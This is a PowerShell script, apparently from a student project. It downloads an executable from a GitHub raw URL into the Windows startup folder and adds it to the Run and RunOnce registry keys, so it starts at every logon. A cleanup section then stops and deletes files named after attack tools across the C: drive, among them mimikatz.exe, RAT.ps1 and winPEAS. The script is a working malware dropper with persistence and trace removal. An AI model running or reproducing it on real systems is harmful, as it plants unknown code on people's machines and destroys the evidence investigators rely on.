$sourceUrl = "https://github.com/prince-spooler/FYP/raw/main/Sync.exe"
$destinationPath = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\MyApp.exe"
$registryLocations = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
)

try {
    # Download the file
    [Net.ServicePointManager]::SecurityProtocol = "Tls,Tls11,Tls12,Ssl3"
    Invoke-WebRequest -Uri $sourceUrl -OutFile $destinationPath -ErrorAction Stop
    
    # Set up registry key and value data
    $registryValueName = "MyApp"
    $registryValueData = $destinationPath
    
    # Set registry values for each location
    foreach ($registryPath in $registryLocations) {
        try {
            Set-ItemProperty -Path $registryPath -Name $registryValueName -Value $registryValueData -ErrorAction Stop
            Write-Host "Saved script to registry location: $registryPath"
        }
        catch {
            Write-Host "Failed to save script to registry location: $registryPath"
        }
    }
    
    Write-Host "File downloaded and saved as 2.exe in the startup folder and registry locations."
    Write-Host "Download successful!"
}
catch {
    Write-Host "File download failed: $($_.Exception.Message)"
}

# cleaning
# Define the array of file names
$fileNames = @(
    "Invoke-winPEAS.ps1",
    "Unquoted-service-path-test-1.ps1",
    "Sync.exe",
    "mimikatz.exe",
    "ExecuteasAnotherUser.ps1",
    "Remote.exe",
    "RAT.ps1",
    "splunksenior.exe"
    "splunkjunior.exe"
)

# Stop running processes and delete files
foreach ($fileName in $fileNames) {
    # Stop the process if it is running
    $processes = Get-Process | Where-Object {$_.Path -like "*\$fileName"} | Select-Object -ExpandProperty Id
    if ($processes) {
        Stop-Process -Id $processes -Force
    }

    # Search for the file and delete it if found
    $results = Get-ChildItem -Path C:\ -Recurse -Filter $fileName -ErrorAction SilentlyContinue
    if ($results) {
        foreach ($result in $results) {
            Remove-Item -Path $result.FullName -Force
        }
    }
}
